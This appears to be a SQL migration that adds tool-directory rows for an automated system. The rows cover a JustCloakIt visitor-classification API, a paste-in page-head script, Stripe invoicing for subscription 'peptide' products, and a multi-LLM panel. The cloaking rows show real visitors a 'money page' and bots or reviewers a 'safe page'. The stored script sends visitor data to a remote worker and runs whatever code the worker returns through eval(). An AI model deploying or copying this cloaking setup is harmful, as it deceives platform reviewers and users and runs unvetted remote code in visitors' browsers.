-- 0028: JustCloakIt classifier, invoice-by-name, and multi-LLM panel directory rows.

INSERT OR REPLACE INTO directory
 (key, type, target, auth, content, category, planner_rank, updated_at)
VALUES

-- ── JustCloakIt (JCI) Enterprise REST classifier ─────────────────────────────
-- POST https://jcibj.com/lapi/rest/r/$JCI_USER_ID  (form-encoded).
-- Returns {"type":"false","status":"passed",...} for a real human visitor (-> show money page),
-- or {"type":"true",...} for a bot/blocked visitor (-> safe page). Mirrors loop-cloaker-router.
('JCI_CLASSIFY', 'http', 'POST https://jcibj.com/lapi/rest/r/$JCI_USER_ID', '',
 '# Classify a visitor via JustCloakIt. Args: ip|ua|lan|ref|qu|inc_loc. type=false+status=passed means real human. Needs JCI_USER_ID secret.
form:ip=$1&ua=$2&lan=$3&ref=$4&qu=$5&inc_loc=$6&is_geo=true&is_gclid=true&is_fbclid=true&ipscore=true',
 'cloaker', 100, datetime('now')),

-- The client-side loader snippet (stored as text) to paste into a page that should cloak.
-- Points at the existing loop-cloaker-router worker; the page slug is the campaign slug.
('JCI_LOADER_SNIPPET', 'fn', 'noop', '',
 '# The JustCloakIt page loader. Replace SLUG with the campaign slug, paste into the page head.
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script><script>$(function(){var e=jstz.determine().name();$.ajax({url:"https://loop-cloaker-router.owner-account.workers.dev/SLUG",type:"POST",data:"tz="+e+"&rui="+location.pathname+location.search+"&qu="+escape(location.search.substr(1))+"&r="+document.referrer+"&sn="+document.domain,success:function(a){if(a){eval(a)}else{$("html").show()}}})});</script>',
 'cloaker', 100, datetime('now')),

-- ── Invoice by name (resolves Stripe price from the catalog) ──────────────────
('SEND_NAMED_INVOICE', 'fn', 'sendNamedInvoice', '',
 '# Bill a named peptide. Args: sku|tier|duration|kind|email|name|phone|mode. sku e.g. ESH-A9; tier starter|standard|advanced; duration 1mo|3mo|6mo|12mo; kind sub|onetime; mode resolve(lookup only, no write)|draft|send(finalize+SMS). Resolves price_id from stripe_catalog.
["$1","$2","$3","$4","$5","$6","$7","$8"]',
 'stripe', 100, datetime('now')),

-- ── Multi-LLM panel (HTTP endpoint is /api/panel; this row is a callable proxy) ─
('PANEL', 'http', 'POST https://miscsubjects.com/api/panel', '',
 '# Ask a panel of LLMs the same questions about one article. Body JSON: {article, questions[], models[]}. Default models GROK_CHAT, KIMI_CHAT, WORKERS_AI_CHAT.
$1',
 'llm', 100, datetime('now'));
